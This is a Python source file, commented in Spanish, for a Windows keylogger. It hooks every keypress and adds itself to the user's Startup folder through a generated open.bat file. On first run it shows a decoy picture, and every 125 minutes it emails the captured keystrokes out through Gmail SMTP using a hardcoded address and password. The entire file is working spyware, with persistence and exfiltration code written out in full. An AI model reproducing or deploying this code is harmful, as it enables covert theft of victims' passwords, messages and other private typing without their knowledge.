#bibliotecas a usar
import keyboard 
import smtplib 
import os, time ,sys
import getpass
USER_NAME = getpass.getuser()
from threading import Timer
from datetime import datetime
from showPic import showPicture 


#funcion para que se inicie al prender la maquina
def add_to_startup(file_path=""):
    file_path = os.path.dirname(os.path.realpath(__file__)) + file_path
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path + ' 1')



SEND_REPORT_EVERY = 7500 #tiempo con el que se enviara el correo en segundos 125 min
EMAIL_ADDRESS = "secrid123@gmail.com" #correo que se usara para el smtp
EMAIL_PASSWORD = "secrid@1234@1234" #contraseña 

class Keylogger:
    
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = "" #se guarda las teclas presionadas
        self.start_dt = datetime.now() #fecha de inicio para los archivos
        self.end_dt = datetime.now() #fecha final para los archivos

    #funcion que se encargara de guardar las pulsaciones del teclado
    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:     #condicion para evitar caracteres especiales
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "BACKSPACE":
                name = ""
            elif name == "TAB":
                name = ""
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name #guardar en el registro
    
    #actualizar nombre de archivo si se guarda en archivo
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    #guardar en el archivo
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    #funcion para enviar el correo con smtp 
    def sendmail(self, email, password, message):
    
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        server.starttls()
        
        server.login(email, password)
      
        server.sendmail(email, email, message)
       
        server.quit()

    #funcion que se encarga de reportar dependiendo el tipo de reporte archivo o email
    #esta funcion se repetira dependiendo de la variable SEND_REPORT_EVERY
    def report(self):
        if self.log:         
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log.encode('utf-8'))
            elif self.report_method == "file":
                self.report_to_file()     
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True #poner el timer como daemon 
        timer.start()

    #funcion para empezar el keylogger
    def start(self):   
        self.start_dt = datetime.now()      
        keyboard.on_press(callback=self.callback)
        self.report()
        keyboard.wait()

def main():

    #para que el keylogger envie por archivo
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    
    #para que el keylogger guarde en archivo
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    
    
    #ver si se paso algun argumento
    #Esta funcion sirve porque cuando se iniciar por con el .bat se envia un argumento para ver si se muestra la imagen o no
    #La imagen solo debera mostrarse la primera vez que se ejecuta
    if(len(sys.argv)==1):
        #Funcion para mostrar la imagen
        showPicture()
        
    #Ruta para cuando se cree el el .bat apunte al ejecutable si se plane hacerlo sin la version ejecutable cambiar a "keylogger.py"
    add_to_startup(file_path="\keylogger.exe")
    
    #Creando el keylogger
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

if __name__ == "__main__":
    main()